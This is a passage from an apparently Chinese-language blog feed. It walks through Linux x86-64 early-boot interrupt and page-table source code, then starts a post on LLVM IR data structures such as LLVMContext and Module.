class="hljs-number">1</span>, <span class="hljs-literal">false</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>idt_setup_from_table主要过程</p><ul><li>idt_init_desc初始化gate_desc，基本上就是把idt_data结构体的内容填进gate_desc结构体</li><li>write_idt_entry将gate_desc写入idt_table对应表项</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// arch\x86\include\asm\segment.h</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IDT_ENTRIES256</span><br><br><span class="hljs-comment">// arch\x86\kernel\idt.c</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">gate_struct</span> <span class="hljs-title">gate_desc</span>;</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">gate_struct</span> &#123;</span><br>u16offset_low;<br>u16segment;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">idt_bits</span><span class="hljs-title">bits</span>;</span><br>u16offset_middle;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_X86_64</span><br>u32offset_high;<br>u32reserved;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125; __attribute__((packed));<br><br>gate_desc idt_table[IDT_ENTRIES] __page_aligned_bss;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">idt_setup_from_table</span><span class="hljs-params">(gate_desc *idt, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> idt_data *t, <span class="hljs-type">int</span> size, <span class="hljs-type">bool</span> sys)</span><br>&#123;<br>gate_desc desc;<br><br><span class="hljs-keyword">for</span> (; size &gt; <span class="hljs-number">0</span>; t++, size--) &#123;<br>idt_init_desc(&amp;desc, t);<br>write_idt_entry(idt, t-&gt;<span class="hljs-built_in">vector</span>, &amp;desc);<br><span class="hljs-keyword">if</span> (sys)<br>set_bit(t-&gt;<span class="hljs-built_in">vector</span>, system_vectors);<br>&#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">idt_init_desc</span><span class="hljs-params">(gate_desc *gate, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> idt_data *d)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) d-&gt;addr;<br><br>gate-&gt;offset_low= (u16) addr;<br>gate-&gt;segment= (u16) d-&gt;segment;<br>gate-&gt;bits= d-&gt;bits;<br>gate-&gt;offset_middle= (u16) (addr &gt;&gt; <span class="hljs-number">16</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_X86_64</span><br>gate-&gt;offset_high= (u32) (addr &gt;&gt; <span class="hljs-number">32</span>);<br>gate-&gt;reserved= <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="early-idt-handler-common"><a href="#early-idt-handler-common" class="headerlink" title="early_idt_handler_common"></a>early_idt_handler_common</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># arch\x86\kernel\head_64.S<br>early_idt_handler_common:<br>cld<br><br># early_recursion_flag避免在early_idt_handler_common程序中递归地产生中断（有点类似于锁）<br>incl early_recursion_flag(%rip)<br><br>/* 压栈通用寄存器 */<br>pushq %rsi/* pt_regs-&gt;si */<br>movq 8(%rsp), %rsi/* RSI = vector number */<br>movq %rdi, 8(%rsp)/* pt_regs-&gt;di = RDI */<br>pushq %rdx/* pt_regs-&gt;dx */<br>pushq %rcx/* pt_regs-&gt;cx */<br>pushq %rax/* pt_regs-&gt;ax */<br>pushq %r8/* pt_regs-&gt;r8 */<br>pushq %r9/* pt_regs-&gt;r9 */<br>pushq %r10/* pt_regs-&gt;r10 */<br>pushq %r11/* pt_regs-&gt;r11 */<br>pushq %rbx/* pt_regs-&gt;bx */<br>pushq %rbp/* pt_regs-&gt;bp */<br>pushq %r12/* pt_regs-&gt;r12 */<br>pushq %r13/* pt_regs-&gt;r13 */<br>pushq %r14/* pt_regs-&gt;r14 */<br>pushq %r15/* pt_regs-&gt;r15 */<br>UNWIND_HINT_REGS<br><br>cmpq $14,%rsi/* 如果是缺页中断则把cr2寄存器中的值赋值给rdi，然后调用early_make_pgtable */<br>jnz 10f<br>GET_CR2_INTO(%rdi)<br>call early_make_pgtable<br>andl %eax,%eax<br>jz 20f/* All good */<br><br>10:<br>movq %rsp,%rdi/* RDI = pt_regs; RSI is already trapnr */<br>call early_fixup_exception/* 不是缺页中断则调用early_fixup_exception进行下面的步骤 */<br><br>20:<br>decl early_recursion_flag(%rip)/* 解锁 */<br>jmp restore_regs_and_return_to_kernel/* kernel人最熟悉的函数（，恢复寄存器并返回 */<br>END(early_idt_handler_common)<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// arch\x86\mm\extable.c</span><br><span class="hljs-type">void</span> __init <span class="hljs-title function_">early_fixup_exception</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pt_regs *regs, <span class="hljs-type">int</span> trapnr)</span><br>&#123;<br><span class="hljs-comment">/* 忽略NMIs */</span><br><span class="hljs-keyword">if</span> (trapnr == X86_TRAP_NMI)<br><span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-comment">/* 没有锁，挂起 */</span><br><span class="hljs-keyword">if</span> (early_recursion_flag &gt; <span class="hljs-number">2</span>)<br><span class="hljs-keyword">goto</span> halt_loop;<br><br>    <span class="hljs-comment">/* 检查cs寄存器 */</span><br><span class="hljs-keyword">if</span> (!xen_pv_domain() &amp;&amp; regs-&gt;cs != __KERNEL_CS)<br><span class="hljs-keyword">goto</span> fail;<br><br>    <span class="hljs-comment">/* 执行对应中断的handler，不展开了 */</span><br><span class="hljs-keyword">if</span> (fixup_exception(regs, trapnr))<br><span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-comment">/* 报告bug */</span><br><span class="hljs-keyword">if</span> (fixup_bug(regs, trapnr))<br><span class="hljs-keyword">return</span>;<br><br>fail:<br>early_printk(<span class="hljs-string">&quot;PANIC: early exception 0x%02x IP %lx:%lx error %lx cr2 0x%lx\n&quot;</span>,<br>     (<span class="hljs-type">unsigned</span>)trapnr, (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)regs-&gt;cs, regs-&gt;ip,<br>     regs-&gt;orig_ax, read_cr2());<br><br>show_regs(regs);<br><br>halt_loop:<br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>halt();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="early-make-pgtable"><a href="#early-make-pgtable" class="headerlink" title="early_make_pgtable"></a>early_make_pgtable</h3><p>传给early_make_pgtable的参数address是cr2的值，cr2中储存的是一个地址，这个地址引起了缺页中断</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __init <span class="hljs-title function_">early_make_pgtable</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> physaddr = address - __PAGE_OFFSET;<span class="hljs-comment">// __PAGE_OFFSET这里是0xffffffff80000000，获取物理地址</span><br><span class="hljs-type">pmdval_t</span> pmd;<br><br>pmd = (physaddr &amp; PMD_MASK) + early_pmd_flags;<br><br><span class="hljs-keyword">return</span> __early_make_pgtable(address, pmd);<br>&#125;<br></code></pre></td></tr></table></figure><p>先看一些定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// arch\x86\include\asm\pgtable_64_types.h</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span><span class="hljs-type">pteval_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span><span class="hljs-type">pmdval_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span><span class="hljs-type">pudval_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span><span class="hljs-type">p4dval_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span><span class="hljs-type">pgdval_t</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span><span class="hljs-type">pgprotval_t</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-type">pteval_t</span> pte; &#125; <span class="hljs-type">pte_t</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EARLY_DYNAMIC_PAGE_TABLES64</span><br><br><span class="hljs-comment">// arch\x86\kernel\head64.c</span><br><span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __initdata next_early_pgt;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># arch\x86\kernel\head_64.S<br>NEXT_PAGE(early_dynamic_pgts)# 一个固定大小缓冲区<br>.fill512*EARLY_DYNAMIC_PAGE_TABLES,8,0<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// arch\x86\kernel\head64.c</span><br><span class="hljs-type">int</span> __init __early_make_pgtable(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">pmdval_t</span> pmd)<br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> physaddr = address - __PAGE_OFFSET;<span class="hljs-comment">// 获取物理地址</span><br><span class="hljs-type">pgdval_t</span> pgd, *pgd_p;<span class="hljs-comment">// 17-25：全局页目录（pgd）</span><br><span class="hljs-type">p4dval_t</span> p4d, *p4d_p;<span class="hljs-comment">// 5级页表使用</span><br><span class="hljs-type">pudval_t</span> pud, *pud_p;<span class="hljs-comment">// 26-34：上层页目录（pud）</span><br><span class="hljs-type">pmdval_t</span> *pmd_p;<span class="hljs-comment">// 35-43：中间页目录（pmd）</span><br><br><span class="hljs-comment">/* 非法地址或页表出错  */</span><br><span class="hljs-keyword">if</span> (physaddr &gt;= MAXMEM || read_cr3_pa() != __pa_nodebug(early_top_pgt))<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>again:<br>pgd_p = &amp;early_top_pgt[pgd_index(address)].pgd;<br>pgd = *pgd_p;<br><br><span class="hljs-keyword">if</span> (!IS_ENABLED(CONFIG_X86_5LEVEL))<span class="hljs-comment">// 不支持5级页表则直接赋值，获取对应p4d表</span><br>p4d_p = pgd_p;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pgd)<span class="hljs-comment">// 支持5级页表且pgd对应表项不为空则获取p4d</span><br>p4d_p = (<span class="hljs-type">p4dval_t</span> *)((pgd &amp; PTE_PFN_MASK) + __START_KERNEL_map - phys_base);<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (next_early_pgt &gt;= EARLY_DYNAMIC_PAGE_TABLES) &#123;<span class="hljs-comment">// 如果重置次数超过限值则重来</span><br>reset_early_page_tables();<br><span class="hljs-keyword">goto</span> again;<br>&#125;<br><br>p4d_p = (<span class="hljs-type">p4dval_t</span> *)early_dynamic_pgts[next_early_pgt++];<span class="hljs-comment">// 从early_dynamic_pgts中取一项用作p4d</span><br><span class="hljs-built_in">memset</span>(p4d_p, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(*p4d_p) * PTRS_PER_P4D);<br>*pgd_p = (<span class="hljs-type">pgdval_t</span>)p4d_p - __START_KERNEL_map + phys_base + _KERNPG_TABLE;<span class="hljs-comment">// 填入pgd对应表项</span><br>&#125;<br>p4d_p += p4d_index(address);<br>p4d = *p4d_p;<span class="hljs-comment">// 获取对应p4d表项（或pgd）</span><br><br>    <span class="hljs-comment">// 以下类似</span><br>    <br><span class="hljs-keyword">if</span> (p4d)<br>pud_p = (<span class="hljs-type">pudval_t</span> *)((p4d &amp; PTE_PFN_MASK) + __START_KERNEL_map - phys_base);<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (next_early_pgt &gt;= EARLY_DYNAMIC_PAGE_TABLES) &#123;<br>reset_early_page_tables();<br><span class="hljs-keyword">goto</span> again;<br>&#125;<br><br>pud_p = (<span class="hljs-type">pudval_t</span> *)early_dynamic_pgts[next_early_pgt++];<br><span class="hljs-built_in">memset</span>(pud_p, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(*pud_p) * PTRS_PER_PUD);<br>*p4d_p = (<span class="hljs-type">p4dval_t</span>)pud_p - __START_KERNEL_map + phys_base + _KERNPG_TABLE;<br>&#125;<br>pud_p += pud_index(address);<br>pud = *pud_p;<br><br><span class="hljs-keyword">if</span> (pud)<br>pmd_p = (<span class="hljs-type">pmdval_t</span> *)((pud &amp; PTE_PFN_MASK) + __START_KERNEL_map - phys_base);<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (next_early_pgt &gt;= EARLY_DYNAMIC_PAGE_TABLES) &#123;<br>reset_early_page_tables();<br><span class="hljs-keyword">goto</span> again;<br>&#125;<br><br>pmd_p = (<span class="hljs-type">pmdval_t</span> *)early_dynamic_pgts[next_early_pgt++];<br><span class="hljs-built_in">memset</span>(pmd_p, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(*pmd_p) * PTRS_PER_PMD);<br>*pud_p = (<span class="hljs-type">pudval_t</span>)pmd_p - __START_KERNEL_map + phys_base + _KERNPG_TABLE;<br>&#125;<br>pmd_p[pmd_index(address)] = pmd;<span class="hljs-comment">// 赋值物理地址+一些标志</span><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="copy-bootdata"><a href="#copy-bootdata" class="headerlink" title="copy_bootdata"></a>copy_bootdata</h2><p>主要不是讲这个函数，因为这个函数触发了缺页中断使得页表发生了变化</p><p>调用copy_bootdata时使用了一个宏，对real_mode_data的值进行了修正</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">copy_bootdata(__va(real_mode_data));<br><br><span class="hljs-comment">// arch\arm\include\asm\memory.h</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __va(x)((void *)__phys_to_virt((phys_addr_t)(x)))</span><br></code></pre></td></tr></table></figure><p>根据调试这个宏应该是将物理地址转化为了线性映射地址</p><p>显然这时候的页表没有这个地址的映射，所以会触发缺页中断</p>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>Source Code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>source code</tag>
      
      <tag>boot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LLVM IR数据结构分析</title>
    <link href="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/"/>
    <url>/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>研究了好几天终于搞清楚llvm的结构了，其实没必要但……一些pwn手对数据结构和内存分布的执着</p><p>过程及其坎坷，光编译一个带符号的.so文件就编译了好几次(╯‵□′)╯︵┻━┻（因为想看内存分布）</p><img src="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/wjx.png" class title="wjx"><span id="more"></span><p>先放一张复杂的图（</p><img src="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/LLVM-IR.png" class title="LLVM-IR"><h2 id="LLVMContext"><a href="#LLVMContext" class="headerlink" title="LLVMContext"></a>LLVMContext</h2><ul><li><p>一个黑盒，管理llvm中基础的、核心的“全局”数据，如类型、标准化的常量表</p></li><li><p>LLVMContext包含了llvm在一个线程中正常运行（比如一个编译任务）所需要的数据，在老版本中这些都是全局数据，现在他们被打包成了一个类LLVMContext，这样llvm就可以支持多线程的编译任务了</p></li><li><p>之后会作为传入参数多次用到，不需要具体知道是什么（</p></li><li><p>Module类中有context成员</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Module</span> &#123;  <br><span class="hljs-keyword">private</span>:<br>  LLVMContext &amp;Context;    <br></code></pre></td></tr></table></figure></li><li><p>创建一个LLVMContext</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">LLVMContext &amp; context = llvm::<span class="hljs-built_in">getGlobalContext</span>();<br></code></pre></td></tr></table></figure><ul><li><p>LLVMContext删除了拷贝构造函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">LLVMContext</span>(LLVMContext &amp;) = <span class="hljs-keyword">delete</span>;<br></code></pre></td></tr></table></figure><p>这样就不行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">LLVMContext context1;<br><span class="hljs-function">LLVMContext <span class="hljs-title">context2</span><span class="hljs-params">(context1)</span></span>;<br></code></pre></td></tr></table></figure></li><li><p>LLVMContext删除了拷贝赋值运算符</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">LLVMContext &amp;<span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> LLVMContext &amp;) = <span class="hljs-keyword">delete</span>;<br></code></pre></td></tr></table></figure><p>这样会不行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">LLVMContext context1;<br>LLVMContext context2;<br>context2 = context1<br></code></pre></td></tr></table></figure><p>要注意使用引用</p></li></ul></li></ul><h1 id="Module"><a href="#Module" class="headerlink" title="Module"></a>Module</h1><p>一些碎碎念：c++太恶心了，嵌套n层类就是一个双链表</p><img src="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/%E6%81%B6%E5%BF%83%E7%9A%84c++.png" class title="恶心的c++"><p>Module主要的成员主要是函数和全局变量的两个链表</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Module</span> &#123;<br>  <span class="hljs-keyword">using</span> GlobalListType = SymbolTableList&lt;GlobalVariable&gt;;<br>  <span class="hljs-keyword">using</span> FunctionListType = SymbolTableList&lt;Function&gt;;<br>    <br><span class="hljs-keyword">private</span>:<br>  GlobalListType GlobalList;<br>  FunctionListType FunctionList; <br></code></pre></td></tr></table></figure><p>内存分布大概长这样👇</p><img src="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/Module.png" class title="Module"><h2 id="创建一个Module"><a href="#创建一个Module" class="headerlink" title="创建一个Module"></a>创建一个Module</h2><p>创建一个Module，需要一个名字和一个LLVMContext</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">Module</span>(StringRef ModuleID, LLVMContext&amp; C);<br></code></pre></td></tr></table></figure><p>一个🌰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">LLVMContext &amp; context = llvm::<span class="hljs-built_in">getGlobalContext</span>();<br>Module* <span class="hljs-keyword">module</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Module</span>(<span class="hljs-string">&quot;test&quot;</span>, context);<br></code></pre></td></tr></table></figure><h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><ul><li><p>Function</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/// @&#125;</span><br><span class="hljs-comment">/// @name Function Iteration</span><br><span class="hljs-comment">/// @&#123;</span><br><br>  <span class="hljs-function">iterator                <span class="hljs-title">begin</span><span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> FunctionList.<span class="hljs-built_in">begin</span>(); &#125;<br>  <span class="hljs-function">const_iterator          <span class="hljs-title">begin</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> FunctionList.<span class="hljs-built_in">begin</span>(); &#125;<br>  <span class="hljs-function">iterator                <span class="hljs-title">end</span>  <span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> FunctionList.<span class="hljs-built_in">end</span>();   &#125;<br>  <span class="hljs-function">const_iterator          <span class="hljs-title">end</span>  <span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> FunctionList.<span class="hljs-built_in">end</span>();   &#125;<br>  <span class="hljs-function">reverse_iterator        <span class="hljs-title">rbegin</span><span class="hljs-params">()</span>      </span>&#123; <span class="hljs-keyword">return</span> FunctionList.<span class="hljs-built_in">rbegin</span>(); &#125;<br>  <span class="hljs-function">const_reverse_iterator  <span class="hljs-title">rbegin</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>&#123; <span class="hljs-keyword">return</span> FunctionList.<span class="hljs-built_in">rbegin</span>(); &#125;<br>  <span class="hljs-function">reverse_iterator        <span class="hljs-title">rend</span><span class="hljs-params">()</span>        </span>&#123; <span class="hljs-keyword">return</span> FunctionList.<span class="hljs-built_in">rend</span>(); &#125;<br>  <span class="hljs-function">const_reverse_iterator  <span class="hljs-title">rend</span><span class="hljs-params">()</span> <span class="hljs-type">const</span>  </span>&#123; <span class="hljs-keyword">return</span> FunctionList.<span class="hljs-built_in">rend</span>(); &#125;<br>  <span class="hljs-function"><span class="hljs-type">size_t</span>                  <span class="hljs-title">size</span><span class="hljs-params">()</span> <span class="hljs-type">const</span>  </span>&#123; <span class="hljs-keyword">return</span> FunctionList.<span class="hljs-built_in">size</span>(); &#125;<br>  <span class="hljs-function"><span class="hljs-type">bool</span>                    <span class="hljs-title">empty</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> FunctionList.<span class="hljs-built_in">empty</span>(); &#125;<br><br>  <span class="hljs-function">iterator_range&lt;iterator&gt; <span class="hljs-title">functions</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">make_range</span>(<span class="hljs-built_in">begin</span>(), <span class="hljs-built_in">end</span>());<br>  &#125;<br>  <span class="hljs-function">iterator_range&lt;const_iterator&gt; <span class="hljs-title">functions</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">make_range</span>(<span class="hljs-built_in">begin</span>(), <span class="hljs-built_in">end</span>());<br>  &#125;<br></code></pre></td></tr></table></figure><p>🌰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Module *<span class="hljs-keyword">module</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> &amp;func : *<span class="hljs-keyword">module</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> 